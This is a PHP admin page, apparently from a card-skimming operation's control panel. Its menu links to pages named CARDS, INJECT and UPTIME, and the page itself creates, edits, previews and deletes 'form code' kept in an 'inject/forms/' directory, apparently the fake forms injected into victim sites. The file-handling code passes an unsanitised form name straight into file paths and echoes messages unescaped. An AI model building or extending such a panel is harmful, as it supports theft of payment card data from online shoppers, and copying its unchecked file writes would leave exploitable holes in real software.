<?php
session_start();

if (!isset($_SESSION['user_logged_in'])) {
    header('Location: login.php');
    exit();
}

if (!isset($_SESSION['user_role']) || $_SESSION['user_role'] !== 'admin') {
    header('Location: dashboard.php');
    exit();
}

$formsDir = 'inject/forms/';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['create_form'])) {
        $formCode = $_POST['form_code'];
        $formName = $_POST['form_name'];
        
        $fileName = $formName . '.txt';
        
        $filePath = $formsDir . $fileName;
        file_put_contents($filePath, $formCode);
        
        $message = "Form saved successfully as $fileName";
    }
	
    if (isset($_POST['delete_form'])) {
        $formName = $_POST['form_name'];
        $filePath = $formsDir . $formName . '.txt';
        
        if (file_exists($filePath)) {
            unlink($filePath);
            $message = "Form $formName deleted successfully";
        } else {
            $message = "Error deleting form $formName";
        }
    }

    if (isset($_POST['edit_form'])) {
        $formName = $_POST['form_name'];
        $formCode = $_POST['form_code'];
        $filePath = $formsDir . $formName . '.txt';
        
        file_put_contents($filePath, $formCode);
        $message = "Form $formName updated successfully";
    }
}

// Загружаем список сохраненных форм из директории
$forms = [];
$files = glob($formsDir . '*.txt');
foreach ($files as $file) {
    $formName = basename($file, '.txt');
    $forms[$formName] = $formName;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8">
    <title>FORMS</title>
    <link href="js/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="js/all.min.css">
    <style>
        .bg-navy { background-color: #1a1a1a; }
        .border-gold { border-color: #2f2e2c; }
        .form-container {
            max-width: 100%;
            margin: 0 auto;
            padding: 20px;
        }
        #formFrame {
            width: 100%;
            height: 600px;
            border: none;
        }
        .title-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
        }
        .title {
            font-size: 2.5rem;
            font-weight: bold;
            color: #d4af37;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .create-form-btn {
            background-color: #d4af37;
            color: #1a1a1a;
            font-weight: bold;
            padding: 0.75rem 1.5rem;
            border-radius: 9999px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .create-form-btn:hover {
            background-color: #b8960c;
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
        }
    </style>
</head>
<body class="bg-navy">
    <div class="flex flex-col min-h-screen">
        <nav class="bg-navy border-b-2 px-6 py-4">
            <div class="container mx-auto flex justify-between items-center">
                <div class="flex space-x-4">
                    <a href="dashboard.php" class="text-yellow-500 hover:text-white">DASHBOARD</a>
                    <a href="cards.php?url_id=&country=&date=&records=20&sort=id&order=desc" class="text-yellow-500 hover:text-white">CARDS</a>
                    <a href="inject.php" class="text-yellow-500 hover:text-white">INJECT</a>
                    <a href="tools.php" class="text-yellow-500 hover:text-white">TOOLS</a>
                    <a href="forms.php" class="text-yellow-500 hover:text-white">FORMS</a>
                    <a href="uptime.php" class="text-yellow-500 hover:text-white">UPTIME</a>
                </div>
                <div>
                    <a href="logout.php" class="text-yellow-500 hover:text-white">LOGOUT</a>
                </div>
            </div>
        </nav>
        <div class="container mx-auto py-8">
            <div class="title-container">
              
                <button onclick="showCreateFormModal()" class="create-form-btn">
                    <i class="fas fa-plus-circle mr-2"></i>Create Form
                </button>
            </div>
            
            <?php if (isset($message)): ?>
                <div class="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded relative mb-4" role="alert">
                    <strong class="font-bold">Success!</strong>
                    <span class="block sm:inline"><?php echo $message; ?></span>
                </div>
            <?php endif; ?>
            
            <div id="formButtons" class="mb-8">
                <?php foreach ($forms as $formName): ?>
                    <button onclick="showFormInIframe('<?php echo htmlspecialchars($formName); ?>')" class="bg-gray-800 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded mr-4 mb-4"><?php echo htmlspecialchars($formName); ?></button>
                <?php endforeach; ?>
            </div>

            <div id="formActions" class="mb-4 hidden">
                <center>
                    <button onclick="deleteForm()" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded mr-4">Delete</button>
                    <button onclick="editForm()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded">Edit</button>
                </center>
            </div>
            
            <div id="formContainer" class="hidden">
                <iframe id="formFrame" title="Form Preview"></iframe>
            </div>
        </div>
        
        <div id="createFormModal" class="fixed z-10 inset-0 overflow-y-auto hidden">
            <div class="flex items-end justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:block sm:p-0">
                <div class="fixed inset-0 transition-opacity" aria-hidden="true">
                    <div class="absolute inset-0 bg-gray-500 opacity-75"></div>
                </div>
                <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true">&#8203;</span>
                <div class="inline-block align-bottom bg-navy rounded-lg text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full">
                    <form action="forms.php" method="post">
                        <div class="bg-navy px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
                            <h3 class="text-lg leading-6 font-medium text-white">Create Form</h3>
                            <div class="mt-4">
                                <label for="formCode" class="block text-sm font-medium text-white">Form Code</label>
                                <textarea id="formCode" name="form_code" rows="6" class="mt-1 block w-full rounded-md bg-gray-800 text-white shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" required></textarea>
                            </div>
                            <div class="mt-4">
                                <label for="formName" class="block text-sm font-medium text-white">Form Name</label>
                                <input type="text" id="formName" name="form_name" class="mt-1 block w-full rounded-md bg-gray-800 text-white shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" required>
                            </div>
                        </div>
                        <div class="bg-gray-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse">
                            <button type="submit" name="create_form" class="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-blue-500 text-base font-medium text-white hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 sm:ml-3 sm:w-auto sm:text-sm">Create</button>
                            <button type="button" onclick="hideCreateFormModal()" class="mt-3 w-full inline-flex justify-center rounded-md border border-gray-300 shadow-sm px-4 py-2 bg-white text-base font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 sm:mt-0 sm:ml-3 sm:w-auto sm:text-sm">Cancel</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <div id="editFormModal" class="fixed z-10 inset-0 overflow-y-auto hidden">
            <div class="flex items-end justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:block sm:p-0">
                <div class="fixed inset-0 transition-opacity" aria-hidden="true">
                    <div class="absolute inset-0 bg-gray-500 opacity-75"></div>
                </div>
                <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true">&#8203;</span>
                <div class="inline-block align-bottom bg-navy rounded-lg text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full">
                    <div class="bg-navy px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
                        <h3 class="text-lg leading-6 font-medium text-white">Edit Form</h3>
                        <div class="mt-4">
                            <label for="editFormCode" class="block text-sm font-medium text-white">Form Code</label>
                            <textarea id="editFormCode" rows="10" class="mt-1 block w-full rounded-md bg-gray-800 text-white shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm" required></textarea>
                        </div>
                    </div>
                    <div class="bg-navy-50 px-4 py-3 sm:px-6 sm:flex sm:flex-row-reverse">
                        <button type="button" onclick="saveEditedForm()" class="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-blue-500 text-base font-medium text-white hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 sm:ml-3 sm:w-auto sm:text-sm">Save</button>
                        <button type="button" onclick="hideEditFormModal()" class="mt-3 w-full inline-flex justify-center rounded-md border border-gray-300 shadow-sm px-4 py-2 bg-white text-base font-medium text-gray-700 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 sm:mt-0 sm:ml-3 sm:w-auto sm:text-sm">Cancel</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        let currentFormName = '';

        function showCreateFormModal() {
            document.getElementById('createFormModal').classList.remove('hidden');
        }
        
        function hideCreateFormModal() {
            document.getElementById('createFormModal').classList.add('hidden');
        }
        
function showFormInIframe(formName) {
    currentFormName = formName;
    var iframe = document.getElementById('formFrame');
    iframe.src = 'includes/form_handler.php?form=' + encodeURIComponent(formName);
    document.getElementById('formContainer').classList.remove('hidden');
    document.getElementById('formActions').classList.remove('hidden');
}

        function deleteForm() {
            if (confirm('Are you sure you want to delete this form?')) {
                var formData = new FormData();
                formData.append('delete_form', 'true');
                formData.append('form_name', currentFormName);

                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        if (xhr.status === 200) {
                            alert('Form deleted successfully');
                            location.reload();
                        } else {
                            alert('Error deleting form');
                        }
                    }
                };
                xhr.open('POST', 'forms.php', true);
                xhr.send(formData);
            }
        }

        function editForm() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
                document.getElementById('editFormCode').value = xhr.responseText;
                document.getElementById('editFormModal').classList.remove('hidden');
            } else {
                alert('Error loading form data');
            }
        }
    };
    xhr.open('GET', 'includes/form_handler.php?form=' + encodeURIComponent(currentFormName) + '&action=edit', true);
    xhr.send();
}

        function saveEditedForm() {
            var newFormCode = document.getElementById('editFormCode').value;
            var formData = new FormData();
            formData.append('edit_form', 'true');
            formData.append('form_name', currentFormName);
            formData.append('form_code', newFormCode);

            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        alert('Form updated successfully');
                        location.reload();
                    } else {
                        alert('Error updating form');
                    }
                }
            };
            xhr.open('POST', 'forms.php', true);
            xhr.send(formData);
        }

        function hideEditFormModal() {
            document.getElementById('editFormModal').classList.add('hidden');
        }

        var script = document.createElement('script');
        script.src = 'js/all.js';
        script.crossOrigin = 'anonymous';
        document.head.appendChild(script);
    </script>
</body>
</html>